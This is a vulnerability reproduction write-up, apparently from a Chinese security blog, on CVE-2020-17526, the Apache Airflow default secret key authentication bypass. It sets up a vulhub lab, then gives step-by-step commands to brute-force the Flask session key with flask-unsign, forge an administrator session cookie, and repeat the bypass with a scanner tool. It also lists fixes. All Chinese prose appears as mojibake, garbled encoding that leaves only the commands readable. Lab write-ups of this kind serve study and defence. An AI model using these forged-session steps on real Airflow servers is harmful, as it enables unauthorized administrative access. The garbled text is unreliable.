# ğŸ’› Apache Airflow é»˜è®¤å¯†é’¥å¯¼è‡´çš„æƒé™ç»•è¿‡

### 1ï¼‰æ¼æ´ä¿¡æ¯

|æ¼æ´åç§°	|å—å½±å“ç»„ä»¶	|æ¼æ´ç±»å‹	|æ¼æ´ç¼–å·	|
|--	|--	|--	|--	|
|Apache Airflowæœªæˆæƒè®¿é—®<br><br>Apache Airflowé»˜è®¤å¯†é’¥æ¼æ´	|[ApacheAirflow](https://airflow.apache.org/)	|æœªæˆæƒè®¿é—®	|CVE-2020-17526	|

|æ¼æ´ç®€ä»‹	|
|--	|
|Apache Airflowæ˜¯ä¸€æ¬¾å¼€æºçš„ï¼Œåˆ†å¸ƒå¼ä»»åŠ¡è°ƒåº¦æ¡†æ¶ã€‚<br>é»˜è®¤æƒ…å†µä¸‹ï¼ŒApache Airflowæ— éœ€ç”¨æˆ·è®¤è¯ï¼Œä½†ç®¡ç†å‘˜ä¹Ÿå¯ä»¥é€šè¿‡æŒ‡å®šwebserver.authenticate=Trueæ¥å¼€å¯è®¤è¯ã€‚<br><br>åœ¨å…¶1.10.13ç‰ˆæœ¬åŠä»¥å‰ï¼Œå³ä½¿å¼€å¯äº†è®¤è¯ï¼Œæ”»å‡»è€…ä¹Ÿå¯ä»¥é€šè¿‡ä¸€ä¸ªé»˜è®¤å¯†é’¥æ¥ç»•è¿‡ç™»å½•ï¼Œä¼ªé€ ä»»æ„ç”¨æˆ·ã€‚	|

|å‚è€ƒé“¾æ¥	|
|--	|
|<ol><li><a href="https://vulhub.org/#/environments/airflow/CVE-2020-17526/">https://vulhub.org/#/environments/airflow/CVE-2020-17526/</a></ol>	|

|è¡¥ä¸åŠä¿®å¤æ–¹æ¡ˆ	|
|--	|
|<ol><li>ä¿®æ”¹[webserver] secret_keyé»˜è®¤é…ç½®ï¼ˆä¿®æ”¹é»˜è®¤å¯†é’¥ï¼‰</li><li>æ›´æ–°è‡³æœ€æ–°ç‰ˆæœ¬ï¼š<a href="https://github.com/apache/airflow">https://github.com/apache/airflow</a></li></ol>	|

### æ¼æ´ç¯å¢ƒ

ä½¿ç”¨[vulhub](https://github.com/vulhub/vulhub)æ­å»ºæ¼æ´ç¯å¢ƒ

```
git clone https://github.com/vulhub/vulhub
cd vulhub/airflow/CVE-2020-17526
docker-compose up -d
```

å¯åŠ¨å®¹å™¨åï¼Œå¯ä»¥åœ¨8080ç«¯å£çœ‹åˆ°Airflowç™»å½•é¡µé¢

<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/apache-airflow/cve-2020-17526/01.png" alt=""><figcaption></figcaption></figure>



### æ¼æ´å¤ç°-æ‰‹å·¥

æŠ“å–ç™»å½•é¡µé¢çš„æ•°æ®åŒ…ï¼ŒæŸ¥çœ‹Response
å¯ä»¥çœ‹åˆ°è¿”å›äº†Set-Cookie

<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/apache-airflow/cve-2020-17526/02.png" alt=""><figcaption></figcaption></figure>


è¿è¡Œpythonçš„pipå®‰è£…è¾…åŠ©å·¥å…·flask-unsign

```shell
pip3 install flask-unsign[wordlist]

# ä½¿ç”¨é˜¿é‡Œäº‘é•œåƒï¼Œå›½å†…å®‰è£…åŠ é€Ÿ
pip3 install flask-unsign[wordlist] -i https://mirrors.aliyun.com/pypi/simple

# ï¼æ³¨æ„ï¼æˆ‘ä»¬éœ€è¦çš„æ˜¯å‘½ä»¤è¡Œå·¥å…·
pip3 install flask-unsign           # è¿™ä¸ªæ˜¯å®‰è£…æºä»£ç 
pip3 install flask-unsign[wordlist] # è¿™ä¸ªæ˜¯å®‰è£…å‘½ä»¤è¡Œå·¥å…·
```

<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/apache-airflow/cve-2020-17526/03.png" alt=""><figcaption></figcaption></figure>


å®‰è£…å®Œæˆä¹‹åï¼Œåœ¨å‘½ä»¤è¡Œè¿è¡Œflask-unsign
å¦‚æœçœ‹åˆ°å·¥å…·æç¤ºä¿¡æ¯ï¼Œè¯´æ˜å®‰è£…æˆåŠŸ

```shell
flask-unsign
```

<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/apache-airflow/cve-2020-17526/04.png" alt=""><figcaption></figcaption></figure>


ç„¶åè¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œå°†Set-Cookieä¸­çš„sessionå‚æ•°ä¼ é€’ç»™flask-unsign
flask-unsignä¼šæš´ç ´sessionçš„åŠ å¯†å¯†é’¥

```shell
flask-unsign -u -c <ä½ çš„SESSION>

# ä¾‹å¦‚
flask-unsign -u -c eyJfZnJlc2giOmZhbHNlLCJjc3JmX3Rva2VuIjoiNzBhZmJhOGQ5ZmI2MDk5NGI2ZTk1YTkwZGUzYTBmZjE5ODA0YWY5YiJ9.ZAK0kQ.jSWDhcPF-n6f2V10PkCnNFUAekk
```

<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/apache-airflow/cve-2020-17526/05.png" alt=""><figcaption></figcaption></figure>

å¦‚æœæš´ç ´æˆåŠŸï¼Œä¼šè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²
æ­¤å¤„å‘ç°sessionçš„åŠ å¯†å¯†é’¥ä¸ºï¼štemporary_key

<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/apache-airflow/cve-2020-17526/06.png" alt=""><figcaption></figcaption></figure>

è·å¾—å¯†é’¥ä¹‹åï¼Œè¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œä¼ªé€ ä¸€ä¸ªæ–°çš„sessionï¼Œä»¥ä¾¿ç™»å½•Airflow

```shell
flask-unsign -s --secret <ä½ çš„å¯†é’¥> -c "{'user_id': '1', '_fresh': False, '_permanent': True}"

# ä¾‹å¦‚
flask-unsign -s --secret temporary_key -c "{'user_id': '1', '_fresh': False, '_permanent': True}"
```

<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/apache-airflow/cve-2020-17526/07.png" alt=""><figcaption></figcaption></figure>

è·å¾—ä¼ªé€ çš„sessionä¹‹åï¼Œå°†å…¶æ·»åŠ åˆ°Cookieå½“ä¸­

```
Cookie: session=ä½ ä¼ªé€ çš„SESSION
```

<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/apache-airflow/cve-2020-17526/08.png" alt=""><figcaption></figcaption></figure>

ç„¶ååˆ·æ–°é¡µé¢ï¼ŒæˆåŠŸè¿›å…¥åå°
<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/apache-airflow/cve-2020-17526/09.png" alt=""><figcaption></figcaption></figure>



### æ¼æ´å¤ç°-vulcat

```shell
python3 vulcat.py -u <URL> -a airflow

# æ³¨æ„, vulcat-v2.0.0ç‰ˆæœ¬åŠä»¥ä¸Š, åº”ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤
python3 vulcat.py -u <URL> -v cve-2020-17526
```

å¦‚å›¾ï¼Œvulcatè¿”å›äº†é»˜è®¤å¯†é’¥ ä»¥åŠ ä¼ªé€ çš„session

<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/apache-airflow/cve-2020-17526/10.png" alt=""><figcaption></figcaption></figure>

å°†ä¼ªé€ çš„sessionæ·»åŠ åˆ°Cookie

<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/apache-airflow/cve-2020-17526/11.png" alt=""><figcaption></figcaption></figure>

åˆ·æ–°é¡µé¢ï¼ŒæˆåŠŸè¿›å…¥åå°

<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/apache-airflow/cve-2020-17526/12.png" alt=""><figcaption></figcaption></figure>


